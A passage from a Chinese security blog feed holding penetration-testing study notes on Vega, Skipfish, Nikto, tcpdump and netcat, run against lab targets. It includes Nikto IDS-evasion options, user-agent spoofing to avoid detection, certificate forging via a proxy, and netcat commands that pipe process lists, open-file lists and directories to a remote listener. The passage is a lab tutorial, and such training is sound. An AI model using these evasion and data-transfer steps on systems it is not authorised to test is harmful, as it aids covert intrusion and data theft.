alt=""></p><pre><code>2、提交数据【随便输入，目的：被Vega抓取数据】</code></pre><p><img src="http://oy0tigw51.bkt.clouddn.com/201711251350_567.jpg" alt=""></p><pre><code>3、URL【?参数=***】在等号后面的值，添加不正常的内容，看返回结果4、view source【服务器端源代码，正常Web application中没有此功能，只为了分析漏洞而提供的功能】5、上传位置【同理：成功与否，无所谓】6、反射性XSS【输入什么内容，就返回什么内容】7、论坛或收集反馈的典型表单页面【】8、phpinfo  #安装PHP后，测试是否能否正常工作 【泄漏大量服务器配置信息】#左边灰白色为页面中存在的链接</code></pre><p><img src="http://oy0tigw51.bkt.clouddn.com/201711251350_798.jpg" alt=""></p><pre><code>#部分扫描结果</code></pre><p><img src="http://oy0tigw51.bkt.clouddn.com/201711251350_220.jpg" alt=""></p><pre><code>9、事后操作-修改内容重放【在时间失效之前】</code></pre><p><img src="http://oy0tigw51.bkt.clouddn.com/201711251351_991.jpg" alt=""></p><p><img src="http://oy0tigw51.bkt.clouddn.com/201711251351_491.jpg" alt=""></p><pre><code>截断功能【代理方面有所欠缺】</code></pre><p><img src="http://oy0tigw51.bkt.clouddn.com/201711251351_90.jpg" alt=""><br>扫描模式【切换】</p><pre><code>vega主动，对页面中的内容、参数进行扫描</code></pre><p><img src="http://oy0tigw51.bkt.clouddn.com/201711251351_475.jpg" alt=""></p><pre><code>配置1、准备     #定义身份认证信息    1、basic http authentication    #http基本身份认证    2、digest http authentication   #http摘要身份认证    3、NTLM                                 #windows系统账号密码认证【未加入域】    4、macro                                 #基于表单【大部分web应用身份认证】</code></pre><p><img src="http://oy0tigw51.bkt.clouddn.com/201711251351_2.jpg" alt=""></p><pre><code>        #创建宏</code></pre><p><img src="http://oy0tigw51.bkt.clouddn.com/201711251352_704.jpg" alt=""></p><p><img src="http://oy0tigw51.bkt.clouddn.com/201711251352_133.jpg" alt=""></p><pre><code>2、开始</code></pre><p><img src="http://oy0tigw51.bkt.clouddn.com/201711251352_828.jpg" alt=""></p><p><img src="http://oy0tigw51.bkt.clouddn.com/201711251352_280.jpg" alt=""><br><img src="http://oy0tigw51.bkt.clouddn.com/201711251352_318.jpg" alt=""></p><pre><code>#查看详细信息console</code></pre><p><img src="http://oy0tigw51.bkt.clouddn.com/201711251352_31.jpg" alt=""></p><pre><code>#请求内容的过程</code></pre><p><img src="http://oy0tigw51.bkt.clouddn.com/201711251352_181.jpg" alt=""></p><p>https证书加密网站【即其既是一个服务网站，又是一个可信证书颁发机构】的扫描【截断代理】</p><pre><code>签名证书：由权威颁发机构颁发给服务器或者个人用于证明自己身份的东西，默认客户端都是信任的。主要目的是用来加密和保证数据的完整性和不可抵赖性自签名证书：由服务器自己颁发给自己，用于证明自己身份的东西，非权威颁发机构发布，默认客户端都是不信任的，主要目的是用来加密和保证数据的完整性和不可抵赖性,与签名证书相同.创建自签名SSL证书：http://www.cnblogs.com/lihuang/articles/4205540.html也是类似，通过vega作为代理服务器，伪造证书，进行信息劫持，进行但要注意：####当访问网站出现信任报错时，可能是有人伪造了证书【如：百度号称全站https，淘宝、阿里、facebook】查看证书</code></pre><p><img src="http://oy0tigw51.bkt.clouddn.com/201711251353_9.jpg" alt=""></p><pre><code>#右键 View Page info</code></pre><p><img src="http://oy0tigw51.bkt.clouddn.com/201711251353_884.jpg" alt=""></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;kali渗透测试之Web渗透-扫描工具-Vega&quot;&gt;&lt;a href=&quot;#kali渗透测试之Web渗透-扫描工具-Vega&quot; class=&quot;headerlink&quot; title=&quot;kali渗透测试之Web渗透-扫描工具-Vega&quot;&gt;&lt;/a&gt;kali渗透测试之Web渗透
      
    
    </summary>
    
      <category term="Kali" scheme="http://0xmj.club/categories/Kali/"/>
    
    
      <category term="Vega" scheme="http://0xmj.club/tags/Vega/"/>
    
  </entry>
  
  <entry>
    <title>kali渗透测试之Web渗透-扫描工具-Skipfish</title>
    <link href="http://0xmj.club/2018/02/27/kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8BWeb%E6%B8%97%E9%80%8F-%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7-Skipfish/"/>
    <id>http://0xmj.club/2018/02/27/kali渗透测试之Web渗透-扫描工具-Skipfish/</id>
    <published>2018-02-27T11:49:37.000Z</published>
    <updated>2018-02-27T11:50:16.340Z</updated>
    
    <content type="html"><![CDATA[<h1 id="kali渗透测试之Web渗透-扫描工具-Skipfish"><a href="#kali渗透测试之Web渗透-扫描工具-Skipfish" class="headerlink" title="kali渗透测试之Web渗透-扫描工具-Skipfish"></a>kali渗透测试之Web渗透-扫描工具-Skipfish</h1><h2 id="任务8：-skipfish"><a href="#任务8：-skipfish" class="headerlink" title="任务8： skipfish"></a>任务8： skipfish</h2><p>Skipfish是一个命令行模式，以C语言编写的积极的Web应用程序的安全性侦察工具，没有代理模式。 它准备了一个互动为目标的网站的站点地图进行一个递归爬网和基于字典的探头。</p><pre><code>优点：速度比较快【多路单线程，全异步网络I/O，消除内存管理和调度开销，支持启发式自动内容识别】，误报相对低</code></pre><p>使用方式：【<a href="https://my.oschina.net/u/995648/blog/114321】" target="_blank" rel="external">https://my.oschina.net/u/995648/blog/114321】</a></p><pre><code>基本命令使用方式    skipfish -o test http:1.1.1.1   #指定输出目录/路径    #ctrl -c   停止    #空格     显示详细信息</code></pre><p>skipfish -o test http:192.168.57.143/dvwa/<br><img src="http://oy0tigw51.bkt.clouddn.com/201711251434_19.png" alt=""><br>打开根目录下的skipfishtest1/index.html文件即可查看详细信息</p><pre><code>    skipfish -o test @url.txt             #字典文件</code></pre><p><img src="http://oy0tigw51.bkt.clouddn.com/201711251439_346.png" alt=""><br>        skipfish -o test -S complet.wl -Wa.wl <a href="http://1.1.1.1" target="_blank" rel="external">http://1.1.1.1</a>   #指定集成参数字典，发现隐藏目录</p><pre><code>        #dpkg -L skipfish | grep wl</code></pre><p><img src="http://oy0tigw51.bkt.clouddn.com/201711251458_169.png" alt=""></p><pre><code>-I （i）：只检查包含‘string’的URL     【适用于大型网站】    skipfish -o test1 -I /dvwa/ http://192.168.57.143/dvwa/-X：不检查包含‘string’的URL   【如：logout】-K：不对指定参数进行fuzz测试-D：跨站点爬另一个域【即目标页面中有另一个域名，则进行扫描】-l：每秒最大请求数-m：每IP最大并发连接数【依据带宽】--config：指定配置文件 【将参数命令写入一个配置文件】</code></pre><p>身份认证【在一种方式不成功的情况下，使用其他方式】</p><pre><code>    skipfish -A user:pass -o test http://1.1.1.1    #基本http身份认证    skipfish  -C &quot;PHPSESSID=&quot; -C &quot;security=&quot; -o test http://1.1.1.1   #</code></pre><p><img src="http://oy0tigw51.bkt.clouddn.com/201711251505_541.png" alt=""><br>       基于cookie</p><pre><code>    Usename / Password                           #直接提交表单        ep：skipfish -o a --auth-form http://192.168.1.109/dvwa/login.php --auth-form-target http://192.168.1.109/dvwa/login.php   --auth-user-filed usename --auth-user admin -auth-pass-filed password -auth-pass password --auth-verify-url http://192.168.1.109/dvwa/index.php -I /dvwa/ http://192.168.1.109/dvwa/</code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;kali渗透测试之Web渗透-扫描工具-Skipfish&quot;&gt;&lt;a href=&quot;#kali渗透测试之Web渗透-扫描工具-Skipfish&quot; class=&quot;headerlink&quot; title=&quot;kali渗透测试之Web渗透-扫描工具-Skipfish&quot;&gt;&lt;/a&gt;ka
      
    
    </summary>
    
      <category term="Kali" scheme="http://0xmj.club/categories/Kali/"/>
    
    
      <category term="Skipfish" scheme="http://0xmj.club/tags/Skipfish/"/>
    
  </entry>
  
  <entry>
    <title>kali渗透测试之Web渗透-扫描工具-Nikto</title>
    <link href="http://0xmj.club/2018/02/27/kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8BWeb%E6%B8%97%E9%80%8F-%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7-Nikto/"/>
    <id>http://0xmj.club/2018/02/27/kali渗透测试之Web渗透-扫描工具-Nikto/</id>
    <published>2018-02-27T11:47:03.000Z</published>
    <updated>2018-02-27T11:47:51.162Z</updated>
    
    <content type="html"><![CDATA[<h1 id="kali渗透测试之Web渗透-扫描工具-Nikto"><a href="#kali渗透测试之Web渗透-扫描工具-Nikto" class="headerlink" title="kali渗透测试之Web渗透-扫描工具-Nikto"></a>kali渗透测试之Web渗透-扫描工具-Nikto</h1><h2 id="任务4：实验环境Metasploaitable和侦察HTTRACK"><a href="#任务4：实验环境Metasploaitable和侦察HTTRACK" class="headerlink" title="任务4：实验环境Metasploaitable和侦察HTTRACK"></a>任务4：实验环境Metasploaitable和侦察HTTRACK</h2><p>httrack 克隆一个网站页面到本地<br><img src="http://oy0tigw51.bkt.clouddn.com/201711231143_886.png" alt=""><br>mkdir dvwa 创建一个目录<br><img src="http://oy0tigw51.bkt.clouddn.com/201711231145_468.png" alt=""></p><p>侦察【减少与目标系统交互】</p><pre><code>Httrack：将WEB可下载的页面下载到本机，再进行本地检查【kali下安装】##可到此网站获取代理：hidemyass.com【免费代理需小心】</code></pre><h2 id="任务5：扫描工具-Nikto"><a href="#任务5：扫描工具-Nikto" class="headerlink" title="任务5：扫描工具-Nikto"></a>任务5：扫描工具-Nikto</h2><p>基于WEB的扫描工具，基本都支持两种扫描模式。代理截断模式，<strong>主动扫描模式</strong></p><p>手动扫描：作为用户操作发现页面存在的问题，但可能会存在遗漏</p><p>自动扫描：基于字典，提高速度，但存在误报和触发警告</p><p>参考书：Web_Penetration_Testing_with_Kali_Linux</p><p>Nikto【纯主动型】<br>   Nikto 是一款Perl语言开发的开源代码的、功能强大的WEB扫描评估软件，能对web服务器多种安全项目进行测试的扫描软件。<br>扫描内容：</p><pre><code>1、软件版本2、搜索存在安全隐患的文件【如：某些web维护人员备份完后，遗留的压缩包，若被下载下来，则获得网站源码】3、服务器配置漏洞【组件可能存在默认配置】    4、WEB Application层面的安全隐患【xss，SQL注入等】    5、避免404误判        ·很多服务器不遵守RFC标准，对于不存在的对象返回200响应码        ·依据响应文件内容判断，不同扩展名【jsp、cji】的文件404响应内容不同        ·去除时间信息后的内容取MD5值        ·参数：-no404【不进行误判尝试判断，可能存在误判】</code></pre><p>命令详解：</p><pre><code>nikto 主要参数man nikto 更多参数nikto -update   #直接更新数据库，厂商网址可能被墙 【在此网站可下载最新版http://cirt.net/nikto/UPDATES/】nikto  -list-plugins       #插件列表</code></pre><p><img src="http://oy0tigw51.bkt.clouddn.com/201711251346_435.jpg" alt=""></p><pre><code>nikto -host http://1.1.1.1 （目标）nikto -host 192.168.1.1 -ssl -port 443,8443,995 扫描端口例如：nikto -host www.baidu.com -port 443 -sslssl即https的端口默认为443</code></pre><p><img src="http://oy0tigw51.bkt.clouddn.com/201711041704_648.png" alt=""></p><p>nikto -host <a href="http://192.168.1.109/dvwa/" target="_blank" rel="external">http://192.168.1.109/dvwa/</a>           #指定网站目录扫描</p><pre><code>nikto -host 192.168.1.1.109 -port 80,443      #可指定多个端口【加-output：输出结果】nikto -host host.txt   #扫描多个IPnmap -p80 192.168.1.0/24 -oG - | nikto -host -        #结合nmap，对一个网段内开放了80端口的主机进行扫描 nikto -host https://www.baidu.com -useproxy http://localhost:8087     #使用代理-vhost  【+域名】   #虚拟IP，区分网站【使用背景：一个ip对应多个网站】</code></pre><p>交互性参数【用于扫描过程中】</p><pre><code>回车：报告当前状态v：正在扫描的详细信息（路径，结果等）#再按v就停止d：极其详细的信息，包括传strong text输内容     #e：错误信息                                    #p：显示进度                               #r：重定向                                   #c：cookiea：身份认证q：退出N：下一个主机（用于多个IP）P：暂停</code></pre><p>nikto配置文件【大部分需要登录进网站，才能进行扫描】</p><pre><code>    -id+    #使用http身份认证【但现在很少】支持指定cookie    vi /etv/nikto.conf</code></pre><p><img src="http://oy0tigw51.bkt.clouddn.com/201711251338_899.jpg" alt=""></p><pre><code>    #修改useagent【默认配置，容易被管理员发现】    USERAGENT=Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)</code></pre><p><img src="http://oy0tigw51.bkt.clouddn.com/201711251345_604.jpg" alt=""></p><pre><code>    #抓包分析，获取cookie</code></pre><p><img src="http://oy0tigw51.bkt.clouddn.com/201711251345_197.jpg" alt=""></p><pre><code>    #修改cookie信息【让nikto获得身份认证，进行进一步扫描】</code></pre><p><img src="http://oy0tigw51.bkt.clouddn.com/201711251345_949.jpg" alt=""></p><pre><code>    -evasion：使用LibWhisker中对IDS的逃避技术，可使用以下几种类型    1、随机URL编码（非UTF-8方式）    2、自选路径（/./）    3、过早结束的URL    4、优先考虑长随机字符串    5、参数欺骗    6、使用TAB作为命令的分隔符    7、使用变化的URL    8、使用windows路径分隔符”\“</code></pre><p><img src="http://oy0tigw51.bkt.clouddn.com/201711251345_7.jpg" alt=""></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;kali渗透测试之Web渗透-扫描工具-Nikto&quot;&gt;&lt;a href=&quot;#kali渗透测试之Web渗透-扫描工具-Nikto&quot; class=&quot;headerlink&quot; title=&quot;kali渗透测试之Web渗透-扫描工具-Nikto&quot;&gt;&lt;/a&gt;kali渗透测试之We
      
    
    </summary>
    
      <category term="Kali" scheme="http://0xmj.club/categories/Kali/"/>
    
    
      <category term="Nikto" scheme="http://0xmj.club/tags/Nikto/"/>
    
  </entry>
  
  <entry>
    <title>kali渗透测试之Web渗透-工具-TCPDUMP</title>
    <link href="http://0xmj.club/2018/02/27/kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8BWeb%E6%B8%97%E9%80%8F-%E5%B7%A5%E5%85%B7-TCPDUMP/"/>
    <id>http://0xmj.club/2018/02/27/kali渗透测试之Web渗透-工具-TCPDUMP/</id>
    <published>2018-02-27T11:42:43.000Z</published>
    <updated>2018-02-27T11:44:07.033Z</updated>
    
    <content type="html"><![CDATA[<p>#kali渗透测试之Web渗透-工具-TCPDUMP</p><h2 id="TCPDUMP-抓包、筛选、高级筛选、过程文档记录"><a href="#TCPDUMP-抓包、筛选、高级筛选、过程文档记录" class="headerlink" title="TCPDUMP-抓包、筛选、高级筛选、过程文档记录"></a>TCPDUMP-抓包、筛选、高级筛选、过程文档记录</h2><p>TCPDUMP</p><p>  No-GUI的抓包分析工具</p><p>  Linux、Unix系统默认安装</p><h3 id="TCPdump—–抓包"><a href="#TCPdump—–抓包" class="headerlink" title="TCPdump—–抓包"></a>TCPdump—–抓包</h3><p>抓包</p><p>  默认只抓68个字节</p><p>  指定端口 -s0指定包有多大就抓多大<br>  tcpdump -i eth0 -s 0 -w file.pcap</p><p>  tcpdump -i eth0 port 22</p><p>读取抓包文件</p><p>  Tcpdump -r file.pcap</p><h3 id="选项介绍"><a href="#选项介绍" class="headerlink" title="选项介绍"></a>选项介绍</h3><p>-A 以ASCII格式打印出所有分组，并将链路层的头最小化。 </p><p>-c 在收到指定的数量的分组后，tcpdump就会停止。 </p><p>-C 在将一个原始分组写入文件之前，检查文件当前的大小是否超过了参数file_size 中指定的大小。如果超过了指定大小，则关闭当前文件，然后在打开一个新的文件。参数 file_size 的单位是兆字节（是1,000,000字节，而不是1,048,576字节）。 </p><p>-d 将匹配信息包的代码以人们能够理解的汇编格式给出。 </p><p>-dd 将匹配信息包的代码以c语言程序段的格式给出。 </p><p>-ddd 将匹配信息包的代码以十进制的形式给出。 </p><p>-D 打印出系统中所有可以用tcpdump截包的网络接口。 </p><p>-e 在输出行打印出数据链路层的头部信息。 </p><p>-E 用spi@ipaddr algo:secret解密那些以addr作为地址，并且包含了安全参数索引值spi的IPsec ESP分组。 </p><p>-f 将外部的Internet地址以数字的形式打印出来。 </p><p>-F 从指定的文件中读取表达式，忽略命令行中给出的表达式。 </p><p>-i 指定监听的网络接口。 </p><p>-l 使标准输出变为缓冲行形式，可以把数据导出到文件。 </p><p>-L 列出网络接口的已知数据链路。 </p><p>-m 从文件module中导入SMI MIB模块定义。该参数可以被使用多次，以导入多个MIB模块。 </p><p>-M 如果tcp报文中存在TCP-MD5选项，则需要用secret作为共享的验证码用于验证TCP-MD5选选项摘要（详情可参考RFC 2385）。 </p><p>-b 在数据-链路层上选择协议，包括ip、arp、rarp、ipx都是这一层的。</p><p>-n 不把网络地址转换成名字。</p><p>-nn 不进行端口名称的转换。</p><p>-N 不输出主机名中的域名部分。例如，‘nic.ddn.mil‘只输出’nic‘。 </p><p>-t 在输出的每一行不打印时间戳。 </p><p>-O 不运行分组分组匹配（packet-matching）代码优化程序。 </p><p>-P 不将网络接口设置成混杂模式。 </p><p>-q 快速输出。只输出较少的协议信息。 </p><p>-r 从指定的文件中读取包(这些包一般通过-w选项产生)。 </p><p>-S 将tcp的序列号以绝对值形式输出，而不是相对值。 </p><p>-s 从每个分组中读取最开始的snaplen个字节，而不是默认的68个字节。 </p><p>-T 将监听到的包直接解释为指定的类型的报文，常见的类型有rpc远程过程调用）和snmp（简单网络管理协议；）。 </p><p>-t 不在每一行中输出时间戳。 </p><p>-tt 在每一行中输出非格式化的时间戳。 </p><p>-ttt 输出本行和前面一行之间的时间差。 </p><p>-tttt 在每一行中输出由date处理的默认格式的时间戳。 </p><p>-u 输出未解码的NFS句柄。 </p><p>-v 输出一个稍微详细的信息，例如在ip包中可以包括ttl和服务类型的信息。 </p><p>-vv 输出详细的报文信息。 </p><p>-w 直接将分组写入文件中，而不是不分析并打印出来。</p><p>root:～# tcpdump -h          </p><pre><code> enter code heretcpdump version 4.3.0libpcap version 1.3.0Usage: tcpdump [-aAbdDefhHIJKlLnNOpqRStuUvxX] [ -B size ] [ -c count ][ -C file_size ] [ -E algo:secret ] [ -F file ] [ -G seconds]             [ -i interface ] [ -j tstamptype ] [ -M secret ]             [ -r file ] [ -s snaplen ] [ -T type ] [ -w file ]             [ -W filecount ] [ -y datalinktype] [ -z command ]             [ -Z user ] [ expression ]</code></pre><p>root:～# tcpdump -i eth0 -s 0 -w a.cap     //监听网络接口字节为0保存到a.cap文件中</p><p>tcpdump: listening on eth0, link-type EN10MB(Ethernet), capture size 65535 bytes</p><p>^C15 packets captured</p><p>15 packets receiced by filter</p><p>0 packets drodded by kernel</p><p>root:～# tcpdump -r a.cap                  //读取a.cap文件内容</p><p>root:～# tcpdump -A -r a.cap               //以ASCII格式打印出所有的分组并且读取此文件</p><p>root:～# tcpdump -X -r a.cap               //以十六进制格式打印出所有的分组并且读取此文件</p><p>root:～# tcpdump -i eth0 tcp port 22</p><p>TCPDUMP——筛选</p><p>  tcpdump -n -r http.cap | awk ‘{print $3}’| sort -u</p><p>  tcpdump -n src host 145.254.160.237 -r http.cap</p><p>  tcpdump -n dst host 145.254.160.237 -r http.cap</p><p>  tcpdump -n port 53 -r http.cap</p><p>  tcpdump -nX port 80 -r http.cap</p><p>root:～/Downloads# tcpdump -n -r http.cap | awk ‘{print $3}’| sort -u</p><p>reading from file http.cap, link type En10MB(Ethernet)</p><p>145.253.2.203.53</p><p>145.254.160.237.3009</p><p>145.254.160.237.3371</p><p>145.254.160.237.3372</p><p>216.239.59.99.80</p><p>65.208.228.223.80</p><p>0                  1                    2                   3</p><p>0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1</p><p>+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</p><p>|          Source Port          |     Destination Port          |       </p><p>+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</p><p>|                        Sequence Number                        |         </p><p>+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</p><p>|                      Acknowledgment Nuber                     |         </p><p>+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</p><p>|  Date  |      |C|E|U|A|P|R|A|F|                               |</p><p>| Offset |  Res.|W|C|R|C|S|S|Y|I|         Windwos               |</p><p>|        |      |R|E|G|K|H|T|N|N|                               |         </p><p>+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</p><p>|            Checksum           |     Urgent Pointer            |         </p><p>+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</p><p>|                      Options               |     Padding      |         </p><p>+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</p><p>|                                data                           |          </p><p>+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</p><p>CEUAPRSF</p><p>00011000 = 24 in decimal</p><p>TCPDUMP——高级筛选</p><p>  tcpdump -A -n ‘tcp[13]=24’ -r http.cap</p><p>过程文档记录</p><p>  Dradis</p><pre><code>短期临时小团队资源共享各种插件导入文件</code></pre><p>  keepnote</p><p>  Truecrypt</p><p>应用程序—–&gt;报告工具库—–&gt;Documentation—–&gt;dradis</p><p>应用程序—–&gt;Office—–&gt;KeepNote</p><p>New Notebook</p><p>新建一个keepnote</p><p>TrueCrypt，是一款免费开源的加密软件，同时支持Windows Vista,7/XP, Mac OS X, Linux 等操作系统。TrueCrypt不需要生成任何文件即可在硬盘上建立虚拟磁盘，用户可以按照盘符进行访问，所有虚拟磁盘上的文件都被自动加密，需要通过密码来进行访问。TrueCrypt 提供多种加密算法，包括：AES-256, Blowfish (448-bit key), CAST5, Serpent, Triple DES, and Twofish，其他特性还有支持FAT32和NTFS分区、隐藏卷标、热键启动等。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;#kali渗透测试之Web渗透-工具-TCPDUMP&lt;/p&gt;
&lt;h2 id=&quot;TCPDUMP-抓包、筛选、高级筛选、过程文档记录&quot;&gt;&lt;a href=&quot;#TCPDUMP-抓包、筛选、高级筛选、过程文档记录&quot; class=&quot;headerlink&quot; title=&quot;TCPDUMP-
      
    
    </summary>
    
      <category term="Kali" scheme="http://0xmj.club/categories/Kali/"/>
    
    
      <category term="TCPDUMP" scheme="http://0xmj.club/tags/TCPDUMP/"/>
    
  </entry>
  
  <entry>
    <title>kali渗透测试之Web渗透-工具-NETCAT</title>
    <link href="http://0xmj.club/2018/02/27/kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8BWeb%E6%B8%97%E9%80%8F-%E5%B7%A5%E5%85%B7-NETCAT/"/>
    <id>http://0xmj.club/2018/02/27/kali渗透测试之Web渗透-工具-NETCAT/</id>
    <published>2018-02-27T11:38:09.000Z</published>
    <updated>2018-02-27T11:44:10.425Z</updated>
    
    <content type="html"><![CDATA[<p>#kali渗透测试之Web渗透-工具-NETCAT</p><p>##NETCAT(传输文件/目录、流媒体服务、端口扫描、远程克隆硬盘)<br>网络工具中的瑞士军刀——小身材、大智慧<br>侦听模式/传输模式<br>telnet/获取banner信息<br>传输文本信息<br>传输文件目录<br>加密传输文件<br>远程控制/木马<br>加密所有流量<br>流媒体服务器<br>远程克隆硬盘</p><h3 id="NC—–TELNET-banner"><a href="#NC—–TELNET-banner" class="headerlink" title="NC—–TELNET/banner"></a>NC—–TELNET/banner</h3><p>nc -nv 1.1.1.1 10<br>nc -nv 1.1.1.1 25<br>nc -nv 1.1.1.1 80<br>root:~# nc -h               //它的基本用法<br> root:~# nc -v               //端口扫描<br>root:~# mtr 200.106.0.20    //追踪一下路由<br>root:~# nc -vn              //显示详细的终端信息，不会Dns解析<br>root:~# ping pop3. 163.com<br>//连接ip邮箱（客户端链接服务器端）<br>root:~# nc -vn 123.125.50.29 110<br>USER<br>USER 12asdfg<br>USER ZmfuZZhvbmcueXVhbkAxNjMuY29tCg==</p><p>root:~# base64<br>fanghong.yuan@163.com<br>（按ctrl+d邮箱编码成：ZmfuZZhvbmcueXVhbkAxNjMuY29tCg==）</p><p>root:~# ping smtp.163.com</p><p>root:~# nc -nv 123.125.20.138 25</p><pre><code>220 163.com Anti-spam GT for Coremail System(163com[20141201])ehlo500 Errot: bad syntaxehlo yuanfh250-mail250-PIPELINING250-AUTH LOGIN PLAIN250-AUTH=LOGIN PLAIN250-coremail 1uxr2xKj7G0xkI17xGrU710s8FY2U3Uj8Cz8x1UUUUU7Ic2IOY2Urz03NIUCa0xDrUUUUj250-ARARTTLS250 8BIMIMEAUTH LOGIN344 dxNLcm5hbWU6fanghong.yuan@163.com535 Error: authentication failed</code></pre><p>root:~# nc -nv 123.125.20.138 25</p><pre><code>220 163.com Anti-spam GT for Coremail System(163com[20141201])ehlo500 Errot: bad syntaxehlo yuanfh250-mail250-PIPELINING250-AUTH LOGIN PLAIN250-AUTH=LOGIN PLAIN250-coremail 1uxr2xKj7G0xkI17xGrU710s8FY2U3Uj8Cz8x1UUUUU7Ic2IOY2Urz03NIUCa0xDrUUUUj250-ARARTTLS250 8BIMIMEAUTH LOGIN344 dxNLcm5hbWU6&lt;fanghong.yuan@163.com&gt;535 Error: authentication failed</code></pre><p>root:~# nc -nv 10.1.1.11 80</p><pre><code>(UNKNOWN) [10.1.1.11] 80 (http) openhead /&lt;html&gt;&lt;head&gt;&lt;titile&gt;Metasploitable2 - Linux&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;pre&gt;warning: Never expose this VM to an untrusted network!Contact: msfdev[at]metasploit.comLogin with msfadmin/msfadmin to get started&lt;/pre&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;/twiki/&quot;&gt;Twiki&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;/phpMyAdmin/&quot;&gt;phpMyAdmin&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;/mutillidae/&quot;&gt;Mutillidae&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;/dvwa/&quot;&gt;DVWA&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;/dav/&quot;&gt;wevDAV&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><h3 id="NC—–传输文本信息"><a href="#NC—–传输文本信息" class="headerlink" title="NC—–传输文本信息"></a>NC—–传输文本信息</h3><p>A: nc -l -p 4444</p><p>B: nc -nv 1.1.1.1 4444</p><p>远程电子取证信息收集</p><p>开启两台系统kalix64和kalix32</p><p>kali 32Bit</p><p>root@kali:~# nc -l -p 333       //打开端口333</p><p>root@kali:~# netstat -pantu | grep 333     //查看端口33是否打开<br>ifconfig查看地址：10.1.1.12<br>kali 64Bit</p><p>root:~# nc -nv 10.1.1.12 333</p><p>(UNKNOWN) [10.1.1.12] 333 (?) open<br><img src="http://oy0tigw51.bkt.clouddn.com/201802271914_628.png" alt=""><br>然后两台电脑实现聊天的功能！</p><h3 id="远程电子取证"><a href="#远程电子取证" class="headerlink" title="远程电子取证"></a>远程电子取证</h3><p>kali 32Bit</p><p>root@kali:~# nnc -l -p 333       //打开端口333</p><p>kali 64Bit</p><p>root:~# ls -l | nc -nv 10.1.1.12 333</p><p>(UNKNOWN) [10.1.1.12] 333 (?) open</p><p>root:~# ps aux              //查看可疑的进程</p><p>kali 32Bit</p><p>root@kali:~# nc -l -p 333 &gt; ps.txt   监听333端口有信息重定向到ps.txt文件里</p><p>kali 64Bit<br>root:~# ps aux | nc -nv 10.1.1.12 333 -q 1<br>(UNKNOWN) [10.1.1.12] 333 (?) open</p><p>kali 32Bit<br>root@kali:~# cat ps.txt         //查看ps.txt文件<br>kali 32Bit<br>root@kali:~# nc -l -p 333 &gt; lsof.txt</p><p>kali 64Bit</p><p>root:~# lsof | nc -nv 10.1.1.12 333 -q 1</p><p>(UNKNOWN) [10.1.1.12] 333 (?)  open</p><p>kali 32Bit</p><p>root@kali:~# more lsof.txt    //这个文件比较多，所以用more查看文件</p><h3 id="NC—-传输文件-目录"><a href="#NC—-传输文件-目录" class="headerlink" title="NC—-传输文件/目录"></a>NC—-传输文件/目录</h3><p>传输文件</p><pre><code>A: nc -lp 333 &gt; 1.mp4 侦听此端口 接受文件B: nc -nv 1.1.1.1. 333 &lt; 1.mp4 - q 1 发送到A的计算机 只连接一秒或A: nc -q -lp 333 &lt; a.mp4 把视频文件放到333侦听端口 发送B: nc -nv 1.1.1.1 333 &gt; 2.mp4 客户端链接的得到文件</code></pre><p>传输目录</p><pre><code>A: tar -cvf - music/ | nc -lp 333 - q 1B: nc -nv 1.1.1.1 333 | tar -xvf -</code></pre><p>加密传文件</p><pre><code>A: nc -lp 333 | mcrypt --flush -Fbqd -a rijndael-256 -m ecb &gt; 1.mp4          文件解密B:  mcrypt --flush -Fbq -a rijndael-256 -m ecb &lt; a.mp4 | nc -nv 1.1.1.1 333 -q 1     文件加密</code></pre><p>A:</p><p>root:~/Desktop# nc -lp 333 | mcrypt –flush -Fbqd -a rijndael-256 -m ecb &gt; 1.mp4 </p><p>Enter passphrase: xxxx </p><p>B:</p><p>root:~/Desktop# mcrypt –flush -Fbq -a rijndael-256 -m ecb &lt; a.mp4 | nc -nv 1.1.1.1 333 -q 1</p><p>Enter the passphrase (maximum of 512 characters)</p><p>Please use a combination of upper and lower case letters and numbers.</p><p>Enter passhrase: (UNKNOWN) [10.1.1.12] 333 (?) open</p><p>en</p><p>Enter passphrase: xxxx</p><p>NC不自带mcrypt,需要自己安装！</p><h3 id="NC—–流媒体服务"><a href="#NC—–流媒体服务" class="headerlink" title="NC—–流媒体服务"></a>NC—–流媒体服务</h3><pre><code>A: cat 